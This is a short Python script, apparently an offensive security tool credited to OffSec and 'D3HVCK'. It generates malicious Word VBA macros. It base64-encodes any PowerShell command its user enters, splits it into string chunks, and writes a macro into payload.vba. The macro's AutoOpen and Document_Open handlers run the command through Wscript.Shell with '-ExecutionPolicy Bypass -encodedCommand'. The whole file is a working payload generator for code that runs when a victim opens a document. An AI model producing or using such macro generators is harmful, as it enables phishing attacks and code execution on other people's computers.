import base64
banner = r"""
██████╗ ███████╗    ██████╗  █████╗  ██████╗██╗  ██╗
██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔════╝██║  ██║
██║  ██║█████╗      ██████╔╝███████║██║     ███████║
██║  ██║██╔══╝      ██╔═══╝ ██╔══██║██║     ██╔══██║
██████╔╝███████╗    ██║     ██║  ██║╚██████╗██║  ██║
╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

    Researched by OffSec, 
    Refined by D3HVCK

"""
print(banner)


def encode_powershell(command):
    encoded_bytes = command.encode("utf-16le")
    base64_encoded = base64.b64encode(encoded_bytes).decode("utf-8")
    return encoded_command_chunks(base64_encoded)

def encoded_command_chunks(encoded_command, chunk_size=50):
    return [encoded_command[i:i+chunk_size] for i in range(0, len(encoded_command), chunk_size)]

def generate_vba_macro(command):
    ps_prefix = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -encodedCommand '
    encoded_chunks = encode_powershell(command)

    vba_macro = """Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
"""
    
    vba_macro += f'    Str = "{ps_prefix}"\n'
    
    for chunk in encoded_chunks:
        vba_macro += f'    Str = Str + "{chunk}"\n'
    
    vba_macro += """    CreateObject("Wscript.Shell").Run Str
End Sub
"""
    
    return vba_macro

user_command = input("Enter your PowerShell command: ")
vba_payload = generate_vba_macro(user_command)

with open("payload.vba", "w") as file:
    file.write(vba_payload)

print("✅ VBA macro generated as payload.vba!")